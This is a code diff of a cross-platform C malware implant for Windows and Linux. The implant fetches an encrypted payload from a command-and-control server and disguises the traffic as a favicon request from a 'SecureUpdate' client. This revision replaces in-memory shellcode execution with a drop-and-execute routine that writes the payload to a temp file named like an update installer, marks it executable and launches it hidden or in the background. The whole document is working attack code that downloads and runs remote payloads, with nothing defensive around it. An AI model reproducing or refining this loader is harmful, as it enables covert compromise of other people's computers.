@@ -7,35 +7,36 @@
     #include <windows.h>
     #include <winhttp.h>
     #include <iphlpapi.h>
+    #include <shellapi.h> // For ShellExecute
     #pragma comment(lib, "winhttp.lib")
     #pragma comment(lib, "iphlpapi.lib")
+    #pragma comment(lib, "shell32.lib")
 
 // ================= LINUX HEADERS =================
 #elif __linux__
-    #include <sys/mman.h>
     #include <sys/socket.h>
     #include <arpa/inet.h>
     #include <unistd.h>
     #include <net/if.h>
     #include <sys/ioctl.h>
     #include <netdb.h>
+    #include <sys/stat.h> // For chmod
 #endif
 
-// DEFAULTS (Used if no arguments provided)
+// DEFAULTS
 #define DEFAULT_IP "127.0.0.1"
 #define DEFAULT_PORT 8080
-#define C2_PATH L"/favicon.ico"     // Windows Path
-#define C2_PATH_LINUX "/favicon.ico" // Linux Path
-#define USER_AGENT L"SecureUpdate/1.0" // Windows UA
-#define USER_AGENT_LINUX "SecureUpdate/1.0" // Linux UA
+#define C2_PATH L"/favicon.ico"
+#define C2_PATH_LINUX "/favicon.ico"
+#define USER_AGENT L"SecureUpdate/1.0"
+#define USER_AGENT_LINUX "SecureUpdate/1.0"
 
-// ================= MAC ADDRESS LOGIC =================
+// ================= MAC ADDRESS LOGIC (Unchanged) =================
 void GetMacAddress(unsigned char* mac) {
 #ifdef _WIN32
     PIP_ADAPTER_INFO pAdapterInfo;
     ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
     pAdapterInfo = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
-
     if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
         free(pAdapterInfo);
         pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);
@@ -47,14 +48,11 @@ void GetMacAddress(unsigned char* mac) {
 #elif __linux__
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
-    
-    // NOTE: Change "eth0" to your specific interface (e.g., wlan0, ens33)
     strcpy(s.ifr_name, "eth0"); 
-    
     if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
         memcpy(mac, s.ifr_addr.sa_data, 6);
     } else {
-        strcpy(s.ifr_name, "wlan0"); // Fallback
+        strcpy(s.ifr_name, "wlan0");
         if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
             memcpy(mac, s.ifr_addr.sa_data, 6);
         }
@@ -63,31 +61,62 @@ void GetMacAddress(unsigned char* mac) {
 #endif
 }
 
-// ================= MEMORY EXECUTION LOGIC =================
-void ExecuteShellcode(unsigned char* code, int size) {
+// ================= NEW: DROP AND EXECUTE LOGIC =================
+void DropAndExecute(unsigned char* data, int size) {
+    char filepath[512];
+
 #ifdef _WIN32
-    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(exec, code, size);
-    ((void(*)())exec)();
+    // 1. Get Temp Path (e.g., C:\Users\Admin\AppData\Local\Temp\)
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    
+    // 2. Create Filename (e.g., update.exe)
+    sprintf(filepath, "%s%s", tempPath, "update_installer.exe");
+    printf("[*] Dropping to: %s\n", filepath);
+
+    // 3. Write File
+    FILE* fp = fopen(filepath, "wb");
+    if (fp) {
+        fwrite(data, 1, size, fp);
+        fclose(fp);
+        
+        // 4. Execute using ShellExecute (Non-blocking)
+        printf("[*] Executing Payload...\n");
+        ShellExecuteA(NULL, "open", filepath, NULL, NULL, SW_HIDE);
+    }
+
 #elif __linux__
-    void* exec = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    memcpy(exec, code, size);
-    ((void(*)())exec)();
+    // 1. Set Path (/tmp/update_installer)
+    sprintf(filepath, "/tmp/update_installer");
+    printf("[*] Dropping to: %s\n", filepath);
+
+    // 2. Write File
+    FILE* fp = fopen(filepath, "wb");
+    if (fp) {
+        fwrite(data, 1, size, fp);
+        fclose(fp);
+
+        // 3. Make Executable (chmod +x)
+        chmod(filepath, 0755);
+
+        // 4. Execute
+        printf("[*] Executing Payload...\n");
+        // Fork to run in background so implant doesn't hang
+        if (fork() == 0) {
+            execl(filepath, filepath, NULL);
+            exit(0);
+        }
+    }
 #endif
 }
 
 // ================= MAIN LOGIC =================
 int main(int argc, char* argv[]) {
-    // 1. Argument Parsing
+    // 1. Parse Arguments
     char* targetIP = DEFAULT_IP;
     int targetPort = DEFAULT_PORT;
-
-    if (argc > 1) {
-        targetIP = argv[1]; // First arg is IP
-    }
-    if (argc > 2) {
-        targetPort = atoi(argv[2]); // Second arg is Port
-    }
+    if (argc > 1) targetIP = argv[1];
+    if (argc > 2) targetPort = atoi(argv[2]);
 
     printf("[*] Configuration: Connecting to %s:%d\n", targetIP, targetPort);
 
@@ -102,53 +131,35 @@ int main(int argc, char* argv[]) {
     int fileSize = 0;
 
 #ifdef _WIN32
-    // --- Windows Implementation ---
-    
-    // CONVERSION: Convert char* (Args) to wchar_t* (WinHTTP)
     wchar_t wIP[256];
-    mbstowcs(wIP, targetIP, 256); // MultiByte String TO Wide Char String
-
+    mbstowcs(wIP, targetIP, 256);
     HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    HINTERNET hConnect = WinHttpConnect(hSession, wIP, targetPort, 0); // Use the converted wIP
+    HINTERNET hConnect = WinHttpConnect(hSession, wIP, targetPort, 0);
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
         WinHttpReceiveResponse(hRequest, NULL);
-        DWORD dwSize = 0;
-        DWORD dwDownloaded = 0;
+        DWORD dwSize = 0, dwDownloaded = 0;
         WinHttpQueryDataAvailable(hRequest, &dwSize);
         buffer = (unsigned char*)malloc(dwSize);
         WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded);
         fileSize = dwDownloaded;
     }
 #elif __linux__
-    // --- Linux Implementation ---
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in serv_addr;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(targetPort);
-    
-    // Linux uses inet_pton which accepts standard char* strings
-    if(inet_pton(AF_INET, targetIP, &serv_addr.sin_addr)<=0) {
-        printf("[-] Invalid address/ Address not supported \n");
-        return -1;
-    }
+    if(inet_pton(AF_INET, targetIP, &serv_addr.sin_addr)<=0) return -1;
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) return 1;
 
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        printf("[-] Connection Failed\n");
-        return 1;
-    }
-
-    // Build Request
     char request[512];
     sprintf(request, "GET %s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", C2_PATH_LINUX, USER_AGENT_LINUX, targetIP);
     send(sock, request, strlen(request), 0);
 
-    // Receive Data
-    unsigned char tempBuf[4096];
-    int valread = read(sock, tempBuf, 4096);
+    unsigned char tempBuf[1000000]; // Larger buffer for full binaries
+    int valread = read(sock, tempBuf, sizeof(tempBuf));
     
-    // Strip Headers (Look for \r\n\r\n)
     int header_end = 0;
     for(int i=0; i < valread-3; i++){
         if(tempBuf[i] == '\r' && tempBuf[i+1] == '\n' && tempBuf[i+2] == '\r' && tempBuf[i+3] == '\n'){
@@ -156,7 +167,6 @@ int main(int argc, char* argv[]) {
             break;
         }
     }
-    
     fileSize = valread - header_end;
     if (fileSize > 0) {
         buffer = (unsigned char*)malloc(fileSize);
@@ -174,11 +184,11 @@ int main(int argc, char* argv[]) {
         }
         printf("[+] Decrypted.\n");
 
-        // 5. Execute
-        ExecuteShellcode(buffer, fileSize);
+        // 5. DROP AND EXECUTE (Instead of Memory Execution)
+        DropAndExecute(buffer, fileSize);
+        
     } else {
-        printf("[-] Failed to download payload from %s:%d\n", targetIP, targetPort);
+        printf("[-] Failed to download payload.\n");
     }
-
     return 0;
 }
